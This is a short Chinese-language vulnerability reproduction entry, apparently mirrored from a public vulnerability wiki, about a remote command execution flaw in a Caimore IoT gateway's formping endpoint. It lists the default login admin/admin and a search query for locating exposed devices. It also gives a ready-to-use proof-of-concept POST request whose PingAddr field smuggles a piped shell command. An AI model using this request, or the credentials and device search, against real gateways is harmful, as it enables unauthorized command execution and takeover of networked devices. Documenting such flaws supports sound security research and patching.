---
title: "才茂通信 网关 formping 远程命令执行漏洞"
date: 2026-10-18 09:16:19
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "才茂通信-网关-formping"
tags:
  - "才茂通信-网关-formping"
  - "命令执行"
  - "弱口令"
  - "漏洞复现"
---
## 漏洞描述

才茂通信网关 formping 接口存在远程命令执行漏洞，攻击者通过默认口令 admin/admin 登陆系统后通过命令可以获取服务器权限

## 漏洞影响

```
才茂通信 网关
```

## 网络测绘

```
app="CAIMORE-Gateway"
```

## 漏洞复现

登陆页面，默认口令 admin/admin

![image-20230417100349175](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230417100349175.png)

验证POC

```
POST /goform/formping
Authorization: Basic YWRtaW46YWRtaW4=

PingAddr=www.baidu.com%7Cls&PingPackNumb=1&PingMsg=
```

![image-20230417100401289](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230417100401289.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
